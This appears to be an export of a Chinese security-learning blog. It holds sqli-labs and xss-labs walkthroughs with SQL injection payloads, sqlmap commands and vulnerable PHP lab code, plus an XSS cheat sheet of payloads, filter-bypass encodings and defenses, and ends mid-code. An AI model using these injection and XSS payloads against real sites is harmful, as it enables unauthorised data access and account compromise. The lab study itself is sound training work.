<p><code>uname=admin&#39;) and left(database(),1)&gt;&#39;n&#39; # &amp; passwd=admin</code></p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-12/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs </code></p>
<h3 id="14POST时间盲注"><a href="#14POST时间盲注" class="headerlink" title="14POST时间盲注"></a>14POST时间盲注</h3><p><code>&quot;</code>闭合 和13题一样</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-14/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<h3 id="15-POST时间-布尔盲注"><a href="#15-POST时间-布尔盲注" class="headerlink" title="15 POST时间/布尔盲注"></a>15 POST时间/布尔盲注</h3><p><code>uname=admin&#39; and sleep(5) #&amp; passwd=admin</code></p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<br>

<h3 id="16POST时间盲注"><a href="#16POST时间盲注" class="headerlink" title="16POST时间盲注"></a>16POST时间盲注</h3><p><code>uname=admin&quot;) and sleep(5) #&amp; passwd=admin</code></p>
<p>SQLmap<br><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-16/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<p><code>python sqlmap.py -r 1.txt --batch --level 3 --dbs</code></p>
<h3 id="17POST显错注入"><a href="#17POST显错注入" class="headerlink" title="17POST显错注入"></a>17POST显错注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;New Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		<span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$update</span>);</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">mysql_error</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="comment">//echo &quot; You password has been successfully updated &quot; ;		</span></span><br><span class="line">]			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>只对<code>username</code>使用<code>check_input()</code>函数进行过滤·,<code>check_input()</code>作用是截取15个字符串，如果开启了GPC,就去掉反斜杠，在判断是否是十进制，如果不是十进制， 就转译掉特殊字符</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line">下列字符受影响：</span><br><span class="line">    \x00</span><br><span class="line">    \n</span><br><span class="line">    \r</span><br><span class="line">    \</span><br><span class="line">    &#x27;</span><br><span class="line">    &quot;</span><br><span class="line">    \x1a</span><br></pre></td></tr></table></figure>

<p><code>uname=admin&amp;passwd=123456&#39; #&amp;submit=Submit</code></p>
<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ &amp;submit=Submit</code></p>
<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+ &amp;submit=Submit</code></p>
<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e),1) --+ &amp;submit=Submit</code></p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -r 1.txt --batch --dbs</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo文章插入图片</title>
    <url>/posts/7ecd88c4/</url>
    <content><![CDATA[<h3 id="本地引用-采用相对路径"><a href="#本地引用-采用相对路径" class="headerlink" title="本地引用(采用相对路径)"></a>本地引用(采用相对路径)</h3><p>在 <code>config.yml</code>文件中配置，post_asset_folder设为true，当再次新建文章时，会在source/_post中生产和文章同名的文件夹，把需要的图片资源放入该文件夹，就可以使用相对路径来引用图片.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br><span class="line">![](image.png)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstudy访问localhost不出现目录的问题</title>
    <url>/posts/2704909e/</url>
    <content><![CDATA[<h4 id="新版phpstudy中，需要在打开-“网站”–-gt-”管理”–-gt-”修改”–-gt-”高级配置”下打开’目录索引’"><a href="#新版phpstudy中，需要在打开-“网站”–-gt-”管理”–-gt-”修改”–-gt-”高级配置”下打开’目录索引’" class="headerlink" title="新版phpstudy中，需要在打开 “网站”–&gt;”管理”–&gt;”修改”–&gt;”高级配置”下打开’目录索引’"></a>新版phpstudy中，需要在打开 “网站”–&gt;”管理”–&gt;”修改”–&gt;”高级配置”下打开’目录索引’</h4><p><img src="/posts/2704909e/phpstudy1.png"></p>
]]></content>
      <categories>
        <category>phpstudy</category>
      </categories>
      <tags>
        <tag>phpstudy</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS总结</title>
    <url>/posts/9f0502f1/</url>
    <content><![CDATA[<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>把用户输入的数据从服务器反射给用户浏览器，要精心构造payload</p>
<p>攻击者通过电子邮件等方式，诱使用户去访问一个包含恶意xss代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。</p>
<p>此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>又称持久型XSS,威胁要比反射型XSS要大,存储在目标服务器中.</p>
<p>用户不需要点击特定的url就可与执行，攻击者事先把恶意代码上传或存储到服务器中，受害者只需点开这个含有恶意代码的页面j就会执行恶意代码，通常可以使用一些网上的xss平台.</p>
<p>此类XSS常出现在网站留言评论等交互处.</p>
<br>

<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>DOM-Based XSS基于DOM文档对象的一种漏洞，是一种特殊类型的反射型XSS.DOM型XSS基于JS上，不需要与服务器进行交互。</p>
<br>

<h2 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h2><h3 id="lt-a-gt-标签"><a href="#lt-a-gt-标签" class="headerlink" title="&lt;a&gt;标签"></a><code>&lt;a&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-img-gt-标签"><a href="#lt-img-gt-标签" class="headerlink" title="&lt;img&gt;标签"></a><code>&lt;img&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;<span class="attr">alert</span>(&#x27;<span class="attr">xss</span>&#x27;)&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-script-gt-标签"><a href="#lt-script-gt-标签" class="headerlink" title="&lt;script&gt;标签"></a><code>&lt;script&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-form-gt-标签"><a href="#lt-form-gt-标签" class="headerlink" title="&lt;form&gt;标签"></a><code>&lt;form&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>)&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="lt-iframe-gt-标签"><a href="#lt-iframe-gt-标签" class="headerlink" title="&lt;iframe&gt;标签"></a><code>&lt;iframe&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);<span class="attr">height</span>=<span class="string">5width</span>=<span class="string">1000</span> /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;aaa&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;) /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-svg-gt-标签"><a href="#lt-svg-gt-标签" class="headerlink" title="&lt;svg&gt;标签"></a><code>&lt;svg&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="常用的on事件"><a href="#常用的on事件" class="headerlink" title="常用的on事件"></a>常用的on事件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">onchange 	      #HTML 元素改变</span><br><span class="line">onclick 	      #用户点击 HTML 元素</span><br><span class="line">onmouseover 	  #用户在一个HTML元素上移动鼠标</span><br><span class="line">onmouseout 	    #用户从一个HTML元素上移开鼠标</span><br><span class="line">onkeydown 	    #用户按下键盘按键</span><br><span class="line">onload 	        #浏览器已完成页面的加载</span><br><span class="line">onerror         #发生错误时执行js</span><br></pre></td></tr></table></figure>

<h2 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/**/ , /符号 ，</span><br></pre></td></tr></table></figure>

<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><br>

<br>

<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ul>
<li>HTML实体编码</li>
</ul>
<p>以<code>&amp;</code>开头，以分号结尾的，</p>
<p>如<code>&lt;</code>的编码为<code>&amp;1t;</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">以&amp;开头，以分号结尾的，如&lt;的编码为&amp;1t;</span><br></pre></td></tr></table></figure>

<ul>
<li>URL编码</li>
</ul>
<p> 可以考虑进行一次url编码或者二次url编码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(1) =&gt; javascript%3Aalert%281%29</span><br><span class="line">alert(&quot;xss&quot;); =&gt; %61%6c%65%72%74%28%22%78%73%73%22%29%3b</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Unicode编码</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">alert(&quot;xss&quot;); =&gt; \u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Ascii码</li>
</ul>
<p><code>var n = String.fromCharCode(65)</code>  输出 <code>A</code></p>
<p><code>var n=String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59);</code> </p>
<p>输出 <code>alert(&quot;xss&quot;);</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Base64</li>
</ul>
<p>JS中用来编码和解码base64的两个函数</p>
<p><code>abto()</code> base64解码</p>
<p><code>btoa()</code> 编码为base64</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ImFsZXJ0KCd4c3MnKSI=&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>八进制</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Hex</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> =&gt; 3C7363726970743E616C657274282278737322293B3C2F7363726970743E</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="过滤url"><a href="#过滤url" class="headerlink" title="过滤url"></a>过滤url</h3><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="IP绕过"><a href="#IP绕过" class="headerlink" title="IP绕过"></a>IP绕过</h4><ul>
<li>十进制IP</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br><span class="line"># 127.0.0.1</span><br></pre></td></tr></table></figure>

<ul>
<li>八进制IP</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>HEX</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>html标签中使用<code>//</code> 代替<code>http://</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><ul>
<li>黑/白名单</li>
<li>对输出编码</li>
<li>对输入过滤</li>
</ul>
<blockquote>
<p>过滤一些危险字符，以及转义 || &lt; &gt; ‘ “ &amp; # 等危险字符</p>
</blockquote>
<ul>
<li>HttpOnly Cookie设置</li>
</ul>
<blockquote>
<p>Cookie在消息头中被设置为HttpOnly,可以阻止客户端JS直接访问浏览器中的cookies，从而达到保护敏感数据的作用</p>
</blockquote>
<ul>
<li><p>限制输入内容长度</p>
</li>
<li><p>CSP(Content Security Policy)</p>
</li>
</ul>
<br>

<br>

<br>

<br>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
<p><a href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a></p>
<p><a href="https://xz.aliyun.com/t/2936">https://xz.aliyun.com/t/2936</a></p>
<p><a href="https://blog.csdn.net/weixin_51356351/article/details/109690416">https://blog.csdn.net/weixin_51356351/article/details/109690416</a></p>
<p><a href="https://wh0ale.github.io/2019/03/19/2019-3-19-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/">https://wh0ale.github.io/2019/03/19/2019-3-19-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs2</title>
    <url>/posts/b04952e9/</url>
    <content><![CDATA[<p>14</p>
<p>这个题目中的url失效了，考察的是exif xss</p>
<p> exif介绍:</p>
<p>可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。</p>
<p>exif xss 简单来讲就是利用exif信息实现xss攻击。 </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">xss</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">12</span> <span class="attr">onclick</span>=<span class="string">&#x27;alert(1)&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<p>15</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>ng-include </code>指令用于包含外部的 HTML 文件。</p>
<p>包含的内容将作为指定元素的子节点。<br><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。<br>默认情况下，包含的文件需要包含在同一个域名下。</p>
</blockquote>
<p>这里考虑调用level1的代码，使用img</p>
<p><code> http://test.ctf8.com/level15.php?src=%27level1.php?name=test&lt;img src=1 onclick=alert(1)&gt;&#39;</code></p>
<br>

<br>

<p>16.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;	